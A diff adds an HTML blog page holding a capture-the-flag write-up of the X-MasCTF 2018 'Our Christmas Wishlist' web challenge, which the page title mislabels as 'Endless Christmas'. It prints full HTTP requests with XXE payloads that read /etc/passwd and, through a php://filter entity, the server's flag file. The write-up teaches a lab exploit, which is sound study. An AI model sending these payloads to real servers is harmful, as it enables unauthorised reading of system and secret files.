@@ -1,0 +1,320 @@
+<!doctype html>
+<html>
+<head>
+    <base href="/">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="author" content="gi0cann">
+
+<meta name="description" content="">
+
+<title>X-MasCTF 2018 RE: Endless Christmas</title>
+<meta name="generator" content="Hugo 0.53" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.1.0/styles/pojoaque.min.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.1.0/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+<link href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" rel="stylesheet" type="text/css">
+<link  href="https://gi0cann.io//css/theme.min.css" rel="stylesheet" type="text/css">
+
+</head>
+<body>
+<div class="page-container container-fluid">
+<div class="col-md-3 menu">
+    <nav class="col-md-3">
+    <h3 class="home-link"><a href="https://gi0cann.io/">Root</a></h3>
+    <div id="last-posts" class="open">
+        <h3 data-open="last-posts">gi0cann&#39;s notes - Most recent posts</h3>
+        <ul>
+            
+            <li><a href="https://gi0cann.io/posts/x-masctf2018-endless-christmas/">X-MasCTF 2018 RE: Endless Christmas</a></li>
+            
+            <li><a href="https://gi0cann.io/posts/x-masctf2018-our-christmas-wishlist/">X-MasCTF 2018 RE: Endless Christmas</a></li>
+            
+        </ul>
+    </div>
+
+    
+    <div id="tags" class="open">
+        <h3 data-open="tags">Tags</h3>
+        <ul class="tags">
+            
+            <li><a href="/tags/burp-suite">burp-suite</a></li>
+            
+            <li><a href="/tags/ctf">ctf</a></li>
+            
+            <li><a href="/tags/php">php</a></li>
+            
+            <li><a href="/tags/radare2">radare2</a></li>
+            
+            <li><a href="/tags/re">re</a></li>
+            
+            <li><a href="/tags/web">web</a></li>
+            
+            <li><a href="/tags/xxe">xxe</a></li>
+            
+        </ul>
+    </div>
+    
+
+    
+    <div id="social" class="open">
+        <h3 data-open="social">socailmedia</h3>
+        <ul class="socail">
+            <li><a href="https://twitter.com/gi0cann">@gi0cann</a></li>
+            <li><a href="https://github.com/gi0cann">https://github.com/gi0cann</a></li>
+        </ul>
+    </div>
+    <div id="rss" class="open">
+        <h3 data-open="rss">rss</h3>
+        <ul class="rss">
+            <li><a href="/index.xml">RSS</a></li>
+        </ul>
+    </div>
+</nav>
+
+</div>
+<div class="col-md-9 content">
+
+<h1>X-MasCTF 2018 RE: Endless Christmas</h1>
+<h4>Published 12-30-2018 21:08:42</h4>
+
+<a href="https://twitter.com/share" class="twitter-share-button" data-via="kendo5731"></a>
+<script>!function (d, s, id) {
+    var js, fjs = d.getElementsByTagName(s)[0], p = /^http:/.test(d.location) ? 'http' : 'https';
+    if (!d.getElementById(id)) {
+        js = d.createElement(s);
+        js.id = id;
+        js.src = p + '://platform.twitter.com/widgets.js';
+        fjs.parentNode.insertBefore(js, fjs);
+    }
+}(document, 'script', 'twitter-wjs');</script>
+
+<div class="fb-share-button" data-href="https://gi0cann.io/posts/x-masctf2018-our-christmas-wishlist/" data-layout="button"></div>
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+    var js, fjs = d.getElementsByTagName(s)[0];
+    if (d.getElementById(id)) return;
+    js = d.createElement(s); js.id = id;
+    js.src = "//connect.facebook.net/en-US/sdk.js#xfbml=1&version=v2.5";
+    fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+<article>
+    
+
+<h1 id="x-masctf-2018-web-our-christmas-wishlist">X-MasCTF 2018 WEB Our Christmas Wishlist</h1>
+
+<p>We are presented with a page with a textarea where you can input text.</p>
+
+<p><img src="wishlist-form-init.png" alt="initial-page" /></p>
+
+<p>We put hello in the textarea an submit the request:</p>
+
+<p><img src="wishlist-form-hello.png" alt="hello-submit" /></p>
+
+<p>We get the following response:</p>
+
+<p><img src="wishlist-form-hello-submit.png" alt="hello-response" /></p>
+
+<p>Taking a look at the request in burp we see the following request:</p>
+
+<pre><code>POST / HTTP/1.1
+Host: 95.179.163.167:12001
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://95.179.163.167:12001/
+Content-Type: application/xml
+Content-Length: 24
+Connection: close
+Cookie: PHPSESSID=9cef815bea8ae2420273c0fbf61f3bcb
+
+&lt;message&gt;hello&lt;/message&gt;
+</code></pre>
+
+<p>with the following response:</p>
+
+<pre><code>HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 14 Dec 2018 22:38:23 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+X-Powered-By: PHP/7.2.10
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+X-XSS-Protection: 1; mode=block
+Content-Length: 16
+
+Your wish: hello
+</code></pre>
+
+<p>Looking at the request we can see that our input is being sent as xml.</p>
+
+<p>We proceed to sent some malformed xml to see how the xml parser will react:</p>
+
+<pre><code>POST / HTTP/1.1
+Host: 199.247.6.180:12001
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://95.179.163.167:12001/
+Content-Type: application/xml
+Content-Length: 2
+Connection: close
+Cookie: PHPSESSID=9cef815bea8ae2420273c0fbf61f3bcb
+
+&lt;&lt;
+</code></pre>
+
+<p>Response:</p>
+
+<pre><code>HTTP/1.1 200 OK
+Server: nginx
+Date: Sun, 16 Dec 2018 21:19:58 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+X-Powered-By: PHP/7.2.10
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+X-XSS-Protection: 1; mode=block
+Content-Length: 811
+
+&lt;br /&gt;
+&lt;b&gt;Warning&lt;/b&gt;:  simplexml_load_string(): Entity: line 1: parser error : StartTag: invalid element name in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;18&lt;/b&gt;&lt;br /&gt;
+&lt;br /&gt;
+&lt;b&gt;Warning&lt;/b&gt;:  simplexml_load_string(): &amp;lt;&amp;lt; in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;18&lt;/b&gt;&lt;br /&gt;
+&lt;br /&gt;
+&lt;b&gt;Warning&lt;/b&gt;:  simplexml_load_string():  ^ in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;18&lt;/b&gt;&lt;br /&gt;
+&lt;br /&gt;
+&lt;b&gt;Warning&lt;/b&gt;:  simplexml_load_string(): Entity: line 1: parser error : Extra content at the end of the document in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;18&lt;/b&gt;&lt;br /&gt;
+&lt;br /&gt;
+&lt;b&gt;Warning&lt;/b&gt;:  simplexml_load_string(): &amp;lt;&amp;lt; in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;18&lt;/b&gt;&lt;br /&gt;
+&lt;br /&gt;
+&lt;b&gt;Warning&lt;/b&gt;:  simplexml_load_string():  ^ in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;18&lt;/b&gt;&lt;br /&gt;
+Your wish: 
+</code></pre>
+
+<p>The error messages in the request shows us the file with the code is located at &lsquo;/var/www/html/index.php&rsquo; and that it&rsquo;s using simplexml.</p>
+
+<p>We try check for XXE(XML External Entity) and by trying retrieve /etc/passwd with the following request:</p>
+
+<pre><code>POST / HTTP/1.1
+Host: 95.179.163.167:12001
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://95.179.163.167:12001/
+Content-Type: application/xml
+Content-Length: 125
+Connection: close
+Cookie: PHPSESSID=9cef815bea8ae2420273c0fbf61f3bcb
+
+&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY internal SYSTEM 'file:///etc/passwd'&gt;]&gt;
+&lt;message&gt;hello:&amp;internal;&lt;/message&gt;
+</code></pre>
+
+<p>And we get a reponse with the contents of the passwd file:</p>
+
+<pre><code>HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 14 Dec 2018 23:56:42 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+X-Powered-By: PHP/7.2.10
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+X-XSS-Protection: 1; mode=block
+Content-Length: 1359
+
+Your wish: hello:root:x:0:0:root:/root:/bin/ash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+news:x:9:13:news:/usr/lib/news:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
+operator:x:11:0:operator:/root:/bin/sh
+man:x:13:15:man:/usr/man:/sbin/nologin
+postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
+cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
+ftp:x:21:21::/var/lib/ftp:/sbin/nologin
+sshd:x:22:22:sshd:/dev/null:/sbin/nologin
+at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
+squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
+xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
+games:x:35:35:games:/usr/games:/sbin/nologin
+postgres:x:70:70::/var/lib/postgresql:/bin/sh
+cyrus:x:85:12::/usr/cyrus:/sbin/nologin
+vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
+ntp:x:123:123:NTP:/var/empty:/sbin/nologin
+smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
+guest:x:405:100:guest:/dev/null:/sbin/nologin
+nobody:x:65534:65534:nobody:/:/sbin/nologin
+www-data:x:82:82:Linux User,,,:/home/www-data:/bin/false
+nginx:x:100:101:Linux User,,,:/var/cache/nginx:/sbin/nologin
+</code></pre>
+
+<p>Now that we know it&rsquo;s vulnerable to XXE all we have to do is find and display the flag.</p>
+
+<p>We send to following request to read the file containing the flag as base64 to avoid problem character for the xml parser:</p>
+
+<pre><code>POST / HTTP/1.1
+Host: 95.179.163.167:12001
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://95.179.163.167:12001/
+Content-Type: application/xml
+Content-Length: 173
+Connection: close
+Cookie: PHPSESSID=9cef815bea8ae2420273c0fbf61f3bcb
+
+&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY internal SYSTEM 'php://filter/convert.base64-encode/resource=/var/www/html/flag.txt'&gt;]&gt;
+&lt;message&gt;&amp;internal;&lt;/message&gt;
+</code></pre>
+
+<p>Response:</p>
+
+<pre><code>HTTP/1.1 200 OK
+Server: nginx
+Date: Sun, 16 Dec 2018 21:28:05 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+X-Powered-By: PHP/7.2.10
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+X-XSS-Protection: 1; mode=block
+Content-Length: 99
+
+Your wish: WC1NQVN7X1RoZV9FeDczcm5hbF9FbnQxdDEzJF9XNG43X1RvX19KbzFuXzdoZV9wNHI3eV9fNzAwX19fX19ffQo=
+</code></pre>
+
+<p>base64 decoding &lsquo;WC1NQVN7X1RoZV9FeDczcm5hbF9FbnQxdDEzJF9XNG43X1RvX19KbzFuXzdoZV9wNHI3eV9fNzAwX19fX19ffQo=&rsquo; give us &lsquo;X-MAS{_The_Ex73rnal_Ent1t13$_W4n7_To<strong>Jo1n_7he_p4r7y</strong>700______}&rsquo; as the flag.</p>
+
+</article>
+
+
+
+</div>
+</div>
+<script src="https://gi0cann.io//js/theme.min.js" type="text/javascript"></script>
+
+
+</body>
+</html>
+
